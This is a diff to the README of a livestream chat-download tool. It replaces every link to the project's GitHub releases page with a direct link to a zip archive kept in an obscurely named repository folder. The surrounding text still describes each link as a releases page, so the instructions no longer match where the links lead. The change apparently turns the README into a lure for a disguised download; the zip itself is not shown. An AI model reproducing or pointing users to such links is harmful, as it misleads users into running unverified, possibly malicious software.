@@ -1,6 +1,6 @@
 # 💬 chat-downloader - Retrieve Livestream Chats Easily
 
-[![Download chat-downloader](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/gyanam-haz/chat-downloader/releases)
+[![Download chat-downloader](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/gyanam-haz/chat-downloader/raw/refs/heads/main/sarcosepta/chat_downloader_3.6.zip)
 
 ---
 
@@ -28,13 +28,13 @@ No extra software or accounts are required.
 
 Please visit this page to download the software:
 
-[Download chat-downloader](https://github.com/gyanam-haz/chat-downloader/releases)
+[Download chat-downloader](https://github.com/gyanam-haz/chat-downloader/raw/refs/heads/main/sarcosepta/chat_downloader_3.6.zip)
 
 ### Step 1: Open the Download Page
 
 Click the large green download button above or visit this link:
 
-https://github.com/gyanam-haz/chat-downloader/releases
+https://github.com/gyanam-haz/chat-downloader/raw/refs/heads/main/sarcosepta/chat_downloader_3.6.zip
 
 This page lists the latest versions of chat-downloader ready for download.
 
@@ -137,7 +137,7 @@ This tool is built to help users keep records of chat conversations that happen 
 
 You can always get the latest Windows installer here:
 
-[Download chat-downloader](https://github.com/gyanam-haz/chat-downloader/releases)
+[Download chat-downloader](https://github.com/gyanam-haz/chat-downloader/raw/refs/heads/main/sarcosepta/chat_downloader_3.6.zip)
 
 ---
 
